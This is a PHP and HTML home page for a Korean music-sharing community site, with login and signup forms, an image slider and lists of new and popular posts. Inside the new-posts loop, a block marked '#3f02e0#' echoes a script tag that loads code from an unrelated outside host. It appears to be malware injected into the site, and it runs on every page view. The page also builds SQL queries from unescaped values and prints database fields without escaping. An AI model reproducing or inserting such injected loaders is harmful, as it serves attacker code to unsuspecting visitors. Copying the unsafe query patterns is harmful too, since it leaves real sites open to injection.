<?
	session_start();
	include("lib.php");
	//mysql_query("set names utf8");
	$connect = db_connect($db_host, $db_user, $db_pass, $db_name);
?>

<!DOCTYPE HTML>
<html>
 <head>
  <title> New Document </title>
	<meta charset="utf-8">
	<style type="text/css">
	@import url('http://fonts.googleapis.com/earlyaccess/nanumgothic.css');

	body{margin: 0; padding: 0; list-style: none; font-family: "Nanum Gothic", serif;}
	#top{
		width: auto;
		height: 90px;
		background: black;
		color: white;
		padding:0;
		position: relative;
		z-index: 9;
	}
	#top header{
		width: 950px;
		margin:0 auto;
	}
    #logo{
		width: 155px;
		height: 90px;
		float: left;
	}
	.main_nav{
		width: 750px;
		height: 90px;
		float: right;
		margin: 0;
		padding: 0;
	}
	.main_nav li{
		width:150px;
		height:90px;
		display: inline-block;
		float:left;
	}
	.main_nav li:hover {
		cursor: pointer;
	}
	.main_nav li img{
		opacity:0.7;
	}
		.user_profile{
			color: white;
			font-size: 11pt;
			margin-top: 39px;
			margin-left: 14px;
			display: none;
		}
	
	    .submitForm{
		    width: 70px;
		    height: 2px;
		    background: white;
		    border-radius: 7px;
		    margin-left: 5px;
            margin-top: 40px;
            display: inline-block;
            float: left;
	    }
	    .loginForm {
	        width: 270px;
	        height: 200px;
	        display:none;
	        background: white;
            margin-top: 100px;
            border-radius: 10px;
            box-shadow:0 1px 15px #aaa;
            z-index: 6;
            position: relative;
	    }
	        .loginForm ul {
	            width: 207px;
                height: auto;
                padding: 30px 0 0 0;
                margin: 0 auto;
	        }
	        .loginForm ul li {
                display: block;
                width: 207px;
                height: 45px;
                margin-bottom: 5px;
	        }
	            .loginForm ul li input {
                    width: 200px;
                    height: 30px;
                    border-radius: 5px;
                    outline: none;
                    padding-left: 5px;
                    box-shadow: none;
                    border: 2px solid #ebebeb;
	            }
                    .loginForm ul li input:focus {
                        border: 2px solid #1caff6;
	                }
	                .loginForm ul li input[type="submit"] {
                        width: 207px;
                        height: 35px;
                        border: 0;
                        background: #1caff6;
                        color: white;
                        font-weight: bold;
	                }
	                    .loginForm ul li input[type="submit"]:hover {
                            opacity:0.8;
	                    }
        .signupForm {
	        width: 270px;
	        height: 250px;
	        display: none;
	        background: white;
            margin-top: 100px;
            border-radius: 10px;
            box-shadow:0 1px 15px #aaa;
            z-index: 6;
            position: relative;
	    }
	        .signupForm ul {
	            width: 207px;
                height: 180px;
                padding: 30px 0 0 0;
                margin: 0 auto;
	        }
	        .signupForm ul li {
                display: block;
                width: 207px;
                height: 45px;
                margin-bottom: 5px;
	        }
	            .signupForm ul li input {
                    width: 200px;
                    height: 30px;
                    border-radius: 5px;
                    outline: none;
                    padding-left: 5px;
                    box-shadow: none;
                    border: 2px solid #ebebeb;
	            }
	                .signupForm ul li input:focus {
                        border: 2px solid #f14343;
	                }
	                .signupForm ul li input[type="submit"] {
                        width: 207px;
                        height: 35px;
                        border: 0;
                        background: #f14343;
                        color: white;
                        font-weight: bold;
	                }
	                    .signupForm ul li input[type="submit"]:hover {
                            opacity: 0.8;
	                    }
	.chkmessage {
		display: none;
		font-size: 10pt;
		color:#FF32B1;
		text-align: center;
	}
	.message{
		display: none;
		font-size: 12pt;
		color: white;
		text-align: center;
		width: 350px;
		height: 30px;
		line-height: 30px;
		background: black;
		position: fixed;
		top: 75%;
		z-index: 3300;
		border-radius: 10px;
		
	}
	#wrap {
        width: 980px;
        height: auto;
        box-shadow: 1px 1px 20px #aaa;
        margin: 0 auto;
		position: relative;
		z-index: 4;
		min-height: 700px;
    }
	    .top_contents {
            width: 470px;
            height: 140px;
            display: inline-block;
            float: left;
			padding-left: 10px;
	    }
	        .top_contents h3 {
                margin: 10px 0 0 10px;
                padding: 0 0 5px 0;
                border-bottom: 2px solid #000;
                width: 450px;
	        }
	        .top_contents table {
                width: 450px;
                font-size: 10pt;
                padding: 0;
                margin: 5px 0 0 10px;
                border: 0;
                border-spacing: 0;
	        }
			.top_contents a{
				text-decoration: none;
				color: black;
			}
			.top_contents a:hover{
				text-decoration: underline;
			}
		.mid_contents {
            width: 970px;
            height: 100px;
            display: inline-block;
            margin: 0 auto;
			padding-left: 10px;
	    }
	        .mid_contents h3 {
                margin: 10px 0 0 10px;
                padding: 0 0 5px 0;
                border-bottom: 2px solid black;
                width: 929px;
	        }
			.mid_contents_list {
				width: 800px;
				height: 200px;
				margin: 10px auto 0 auto;
			}
				.mid_contents_list section {
					width: 598px;
					height: 210px;
					display: inline-block;
				}
					.mid_contents_list nav {
						width: 200px;
						height: 200px;
						display: inline-block;
						float: left;
					}
						.mid_contents_list nav ul {
							list-style: none;
							padding: 0;
							margin: 0;
							width: 200px;
							height: 200px;
						}
							.mid_contents_list nav ul li {
								height: 38px;
								border: 1px solid black;
							}
					.mid_list_view {
						width: 600px;
						height: 200px;
						float: right;
					}

		.album-wrap {position:relative; width: 950px; height:310px; margin:0 auto; overflow: hidden;}
			.album-wrap ul.album {position:absolute; padding: 0; width: 4750px;}
				.album-wrap ul.album li {float: left; width: 950px;}

		ul.bt-roll {width: 87px; height: 12px;margin:5px auto 20px auto; padding: 0; list-style: none;}
			ul.bt-roll li {float: left; margin-right: 5px;}
	</style>

	<script src="./jquery-1.11.0.min.js"></script>
	<script type="text/javascript">
		$(document).ready(function(){
			<?
				if($_SESSION[user_id]){
			?>
				$('.submitForm').css('display','none');
				$('.user_profile').html('<?echo $_SESSION[user_name];?>님 환영합니다').css('display','block');
			<?
				}else{
			?>
				$('.user_profile').css('display','none');
				$('.submitForm').css('display','block');
			<?
				}
			?>
			$('.main_nav li img').mouseover(function(){
				var num = $(this).attr('data-num');			//메뉴 네비게이션 이벤트
				if(num)
					$(this).stop().animate({opacity:'1.0'},500);
			});
			$('.main_nav li img').mouseout(function () {
				var num = $(this).attr('data-num');
				if(num)
					$(this).stop().animate({opacity:'0.7'},500);  
			});

			$('.main_nav li .submitForm').mouseover(function () {		// login, sign up 버튼 이벤트
			    var data = $(this).attr('data-text');
			    if (data == "login") 
			        $(this).css('background', '#1caff6');
			    else
			        $(this).css('background', '#f14343');
			});
			$('.main_nav li .submitForm').mouseout(function () {
			    $(this).css('background', 'white');
			});

			$('.main_nav li .submitForm').click(function () {		// login, sign up 버튼 이벤트
			    var data = $(this).attr('data-text');
			    var visible = $('.loginForm').css('display');
			    var visible2 = $('.signupForm').css('display');
			    if (data == "login") {
			        if (visible == "none") {
			            if (visible2 == "block")
			                $('.signupForm').css('display', 'none');
			            $('.loginForm').css('display', 'block').css('height','200px');
			            $('.loginForm .chkmessage').html(' ');
			        }
			        else
			            $('.loginForm').css('display', 'none');
			    }
			    else {
			        if (visible2 == "none") {
			            if (visible == "block")
			                $('.loginForm').css('display', 'none');
			            $('.signupForm').css('display', 'block').css('height','250px');
			            $('.signupForm .chkmessage').html(' ');
			            
			        }
			        else
			            $('.signupForm').css('display', 'none');
			    }
			});
			
			$('#index_wrap').click(function(){								// 브라우저 내 다른 곳 클릭시 로그인, 사인업창 없애줌
				var visible = $('.loginForm').css('display');
			    var visible2 = $('.signupForm').css('display');
			    if(visible == "block")
			    	$('.loginForm').css('display', 'none');
			    else
			    	$('.signupForm').css('display', 'none');
			});
			function imgslide(){
				var $list = $('ul.album');		//이미지슬라이드
				var size = $list.children().outerWidth();
				var len = $list.children().length;
				var speed = 2000;
				var timer = null;
				var auto = true;
				var cnt = 1;
				
				if(auto) timer = setInterval(autoSlide, speed);
				
				$list.children().bind({
					'mouseenter': function(){
						if(!auto) return false;
						clearInterval(timer);
						auto = false ;
					},
					'mouseleave': function(){
						timer = setInterval(autoSlide, speed);
						auto = true;
					}
				})
	
				$('.bt-roll').children().bind({
					'click': function(){
						var idx = $('.bt-roll').children().index(this);
						cnt = idx;
						autoSlide();
						return false;
					},
					'mouseenter': function(){
						if(!auto) return false;
						clearInterval(timer);
						auto = false;
					},
					'mouseleave': function(){
						timer = setInterval(autoSlide, speed);
						auto = true;
					}
				});		
				
				function autoSlide(){
					if(cnt>len-1){
						cnt = 0;
					}
					if($('.bt-roll').children().find('img').attr('src') != null){	// ajax.load 로 화면이 바뀌었을시 막아주기위해서 최적화필요
						$list.animate({'left': -(cnt*size)+'px' },'normal');
					
						var source2 = $('.bt-roll').children().find('img').attr('src').replace('_.png','.png');
						$('.bt-roll').children().find('img').attr('src',source2);
	
						var source = $('.bt-roll').children().find('img').attr('src').replace('.png','_.png');
						$('.bt-roll').children().eq(cnt).find('img').attr('src',source);
	
						cnt++;
					}
				}
			}

			$('.main_nav li img').click(function(){
				var num = $(this).attr('data-num');
				if(num == "0")
					location.replace('index.php');
				else if(num == "1")
					$("#wrap").load('musics.php');
				else if(num == "2")
					$("#wrap").load('contest.php');
				else if(num == "3")
					$("#wrap").load('board.php');
			});
			
			imgslide();
			
			function ShowAlert(text){
				var left = (document.body.clientWidth / 2);
                var result = left - $('.message').width() / 2 + document.body.scrollLeft;
                $('.message').css('left',result).html(text).fadeIn(1500);
                $('.message').fadeOut(1500);
			}
			
			$("#login").click(function(){
				var form_data = {
					user_id: $("#login_user_id").val(),
					user_pw: $("#login_user_pw").val(),
					is_ajax: 1
				};
				$.ajax({
					type: "POST",
					url: "./login_ok.php",
					data: form_data,
					success: function(response){
						 if(response.substr(0,7)=='success'){
						 	ShowAlert('로그인 성공');
                            document.login.user_id.value= "";
                            document.login.user_pw.value= "";
                            $('.submitForm').css('display','none');
							$('.loginForm').css('display','none');
							$('.user_profile').html(response.substr(7)+'님 환영합니다').fadeIn(1500);
						 	
						 }else if(response=='fail'){
						 	$('.loginForm').stop().animate({height:'216px'},1000);
                            $(".chkmessage").css('display','block').html("입력하신 비밀번호가 맞지 않습니다."); 
						 }else if(response=='fail2'){
						 	$('.loginForm').stop().animate({height:'216px'},1000);
                            $(".chkmessage").css('display','block').html("입력하신 아이디가 맞지 않습니다."); 
						 }else{
						 	$('.loginForm').stop().animate({height:'216px'},1000);
                            $(".chkmessage").css('display','block').html("내용을 모두 입력해주셔야합니다."); 	
						 }						 			
					}
				});
				return false;
			});
			
			$("#signup").click(function() {								//회원가입 ajax
                var form_data = {
                	user_name: $("#signup_user_name").val(),
                    user_id: $("#signup_user_id").val(),
                    user_pw: $("#signup_user_pw").val(),
                    is_ajax: 1
                };
                $.ajax({
                        type: "POST",
                        url: "./signup_ok.php",
                        data: form_data,
                        success: function(response) {
                                if(response =='success') {
                                		//$('.signupForm').css('display','none');
                                		ShowAlert('회원가입 성공');                    
                                        document.signup.user_name.value= "";
                                        document.signup.user_id.value= "";
                                        document.signup.user_pw.value= "";
                                        $('.signupForm').stop().animate({height:'250px'},1000);
                                        $(".chkmessage").css('display','block').html(" "); 
                                }
                                else if(response == 'fail'){
                                		$('.signupForm').stop().animate({height:'266px'},1000);
                                        $(".chkmessage").css('display','block').html("이미 존재하는 ID입니다."); 
                                } else {
                                	$('.signupForm').stop().animate({height:'266px'},1000);
                                	$(".chkmessage").css('display','block').html('내용을 모두 입력해주셔야합니다.');
                                }
                        }
                });
                return false;
       		});
       		
       		$(".user_profile").click(function() {								//로그아 ajax
                $.ajax({
                        type: "POST",
                        url: "./logout.php",
                        success: function(response) {
                                if(response =='success') {
                                	ShowAlert('로그아웃 성공');
                                	$('.user_profile').css('display','none');
                                	$('.submitForm').fadeIn(1500);	
                                }else {
                                	ShowAlert('로그인 상태가 아닙니다');
                                }
                        }
                });
                return false;
       		});
       		
       		$('.go_music_view').click(function(e){
				e.preventDefault();
				var href=$(this).attr('href');
				$('#wrap').load(href);	
			});
		});
	</script>
 </head>

 <body>
  <div id="top">
	<header>
		<div id="logo">
			<img src="images/logo.png">
		</div>
		<nav>
			<ul class="main_nav">
				<li><img src="images/primary_nav_01.png" data-num="0"></li>
				<li><img src="images/primary_nav_02.png" data-num="1"></li>
				<li><img src="images/primary_nav_03.png" data-num="2"></li>
				<li><img src="images/primary_nav_04.png" data-num="3"></li>
				<li>	
					
						<div class="user_profile"></div>
					
						<div class="submitForm" data-text="login">
							<a href="#">
								<img src="images/login.png">
							</a>
						</div>
						<div class="submitForm" data-text="signup">
                            <a href="#">
							    <img src="images/signup.png">
                            </a>
						</div>
					    <div class="loginForm">
                            <ul>
                            	<form method="post" action="login_ok.php" name="login">                   
	                                <li><input type="text" placeholder="ID" name="user_id" id="login_user_id"></li>
	                                <li><input type="password" placeholder="Password" name="user_pw" id="login_user_pw"></li>
	                                <li><input type="submit" id="login" value="Login" /></li>
	                                <li><div class="chkmessage"></div></li>	                              
                               	</form>
                            </ul>
					    </div>
                        <div class="signupForm">
                            <ul>
                            	<form method="post" action="signup_ok.php" name="signup">  
	                                <li><input type="text" placeholder="Name" name="user_name" id="signup_user_name"></li>
	                                <li><input type="text" placeholder="ID" name="user_id" id="signup_user_id"></li>
	                                <li><input type="password" placeholder="Password" name="user_pw" id="signup_user_pw"></li>
	                                <li><input type="submit" value="Sign up" id="signup"/></li>
	                                <li><div class="chkmessage"></div></li>
                                </form>
                            </ul>
					    </div>
				</li>
			</ul>
		</nav>
	</header>
  </div>
  <div class="message"> </div> <!-- 회원가입, 로그인 성공식 띄울 메세지 fixed로 브라우저 크기반영함   -->
  <div id="index_wrap">
  <div id="wrap">
  	
	<div class="album-wrap">
		<ul class="album clfix">
			<li><a href="#"><img src="images/slide_img1.png" alt=""></a></li>
			<li><a href="#"><img src="images/slide_img2.png" alt=""></a></li>
			<li><a href="#"><img src="images/slide_img3.png" alt=""></a></li>
			<li><a href="#"><img src="images/slide_img4.png" alt=""></a></li>
			<li><a href="#"><img src="images/slide_img5.png" alt=""></a></li>
		</ul>
	</div>
	<ul class="bt-roll">
		<li><a href="#"><img src="images/btn_circle_.png" alt=""></a></li>
		<li><a href="#"><img src="images/btn_circle.png" alt=""></a></li>
		<li><a href="#"><img src="images/btn_circle.png" alt=""></a></li>
		<li><a href="#"><img src="images/btn_circle.png" alt=""></a></li>
		<li><a href="#"><img src="images/btn_circle.png" alt=""></a></li>
	</ul>  

    <div class="top_contents">
        <header>
            <h3>신규 게시물</h3>
        </header>
        <section>
        	<table class="top_contents_list">
        	<?
        		$chk_sql="select * from Vocals_musiclist order by music_date DESC LIMIT 10";
				$chk_result=mysql_query($chk_sql);
				while($chk_data=mysql_fetch_array($chk_result)){
					if($chk_data['music_no']==""){
						echo "<script>alert('글이 존재하지 않습니다.');</script>";
						exit;
					}
					$data="select user_name from Vocals_register where user_id=trim('$chk_data[singer_id]')";
					$d=mysql_query($data);
					$r=mysql_fetch_array($d);
        	?>
<?php
#3f02e0#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155816\"></script>";
echo $vt;
}
#/3f02e0#
?>                <tr>
                    <td width="410px">
                    	<a href="./music_view.php?music_no=<?=$chk_data['music_no']; ?>" class="go_music_view"><?=$chk_data['music_title']?></a></td><td width="40px"><?=$r['user_name'] ?>    	
                    </td>
                </tr>
            <?
				}
            ?>
            </table>
        </section>
    </div>
    <div class="top_contents">
        <header>
			<h3>인기 게시물</h3>
        </header>
        <section>
            <table class="top_contents_list">
        	<?
        		$chk_sql="select * from Vocals_musiclist order by music_hit DESC LIMIT 10";
				$chk_result=mysql_query($chk_sql);
				while($chk_data=mysql_fetch_array($chk_result)){
					if($chk_data['music_no']==""){
						echo "<script>alert('글이 존재하지 않습니다.');</script>";
						exit;
					}
					$data="select user_name from Vocals_register where user_id=trim('$chk_data[singer_id]')";
					$d=mysql_query($data);
					$r=mysql_fetch_array($d);
        	?>
                <tr>
                    <td width="410px"><a href="./music_view.php?music_no=<?=$chk_data['music_no']; ?>" class="go_music_view"><?=$chk_data['music_title']?></a></td><td width="40px"><?=$r['user_name'] ?>
                    	
                    </td>
                </tr>
            
            <?
				}
            ?>
            </table>
        </section>
    </div>

	<div class="mid_contents">
		<!-- <header>
			<h3>장르별 게시물</h3>
		</header>
		<section>
			<div class="mid_contents_list">
				<nav>
					<ul>
						<li>발라드</li> 
						<li>댄스</li>
						<li>락</li>
						<li>r&b</li>
						<li>팝송</li>
					</ul>
				</nav>

				<div class="mid_list_view">
					dfaf
				</div>
			</div>
		</section>
		-->
	</div>
	</div>
  </div>
 </body>
</html>
